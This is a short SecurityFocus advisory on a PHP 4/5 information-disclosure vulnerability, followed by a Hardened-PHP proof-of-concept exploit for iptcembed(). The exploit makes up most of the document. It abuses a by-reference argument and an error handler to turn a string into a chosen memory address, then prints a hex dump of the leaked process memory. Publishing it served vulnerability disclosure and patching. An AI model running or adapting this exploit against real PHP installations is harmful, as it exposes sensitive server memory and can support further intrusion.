source: http://www.securityfocus.com/bid/23202/info

PHP is prone to an information-disclosure vulnerability due to a design error.

The vulnerability resides in various functions that accept parameters as references.

Successful exploits will allow attackers to obtain sensitive information. Information harvested may assist on further attacks.

PHP 4 through 4.4.6 and 5 through 5.2.1 are affected. 

<?php
  
////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  
//
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ 
//
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ 
//
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   
//
  //                                                                    
//
  //         Proof of concept code from the Hardened-PHP Project        
//
  //                   (C) Copyright 2007 Stefan Esser                  
//
  //                                                                    
//
  
////////////////////////////////////////////////////////////////////////
  //     PHP iptcembed() Interruption Information Leak Vulnerability    
//
  
////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die("REMOVE THIS LINE");

  define("LEAK_ADDR", 0x08048000);
  define("LEAK_SIZE", 0x100);



  set_error_handler("myErrorHandler");

  $filename = md5(uniqid());
  $data = "\xff\xd8\xff\xe0\x00\x00\xd9";
  file_put_contents("filename", $data);

  $str = str_repeat("A", LEAK_SIZE);

  @ob_start();
  iptcembed(&$str, "filename", new dummy());
  $data = ob_get_contents();
  $memdump = substr($data, 7+31);
  ob_end_clean();
            

  unlink($filename);

  class dummy
  {
  }
  
  function myErrorHandler()
  {
    $GLOBALS['str'] = (int)$GLOBALS['str'];
    $GLOBALS['str'] += LEAK_ADDR;
    return true;
  }

  echo "memdump\n---------\n\n";
  
  for ($b=0; $b<strlen($memdump); $b+=16) {
    printf("%08x: ", $b);
    for ($i=0; $i<16; $i++) {
      printf ("%02x ", ord($memdump[$b+$i]));
    }
    for ($i=0; $i<16; $i++) {
      $c = ord($memdump[$b+$i]);
      if ($c >= 127 || $c < 32) {
        $c = ord(".");
      }
      printf ("%c", $c);
    }
    printf("\n");
  }
?>

